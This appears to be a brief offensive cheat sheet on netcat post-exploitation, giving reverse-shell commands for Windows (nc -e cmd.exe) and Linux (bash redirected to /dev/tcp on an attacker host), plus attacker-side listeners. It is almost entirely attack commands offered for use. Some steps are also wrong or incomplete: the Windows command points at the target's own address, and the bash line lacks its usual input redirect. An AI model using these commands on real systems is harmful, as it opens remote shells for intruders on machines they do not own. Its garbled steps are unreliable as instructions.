# Netcat Post Exploitation Techniques
This cheat sheet is for techniques using the Netcat utility during post-exploitation for data exfiltrarion, shell creation and more.
## Reverse Netcat Shell (WINDOWS)
1. On Attacker System, Start the Listener:
```
nc -lvvnp 443
```
2. On Target System, Cnnect to Listener on Attacker:
```
nc -nv (TARGET IP ADDRESS) 443 -e cmd.exe
```
## Reverse Shell (LINUX)
On a Linux system, wecan use Bash to start a reverse shell. First we start the listener on our attacker machine,
```
root@attackewr-machine:~$ nc -lvvnp (ATTACKER PORT)
```
Next, we send the Bash command to the attacker's socket, like so,
```
user@target-system:~$ bash -i >& /dev/tcp/(ATTACKER IP ADDRESS)/(ATTACKER PORT)
```
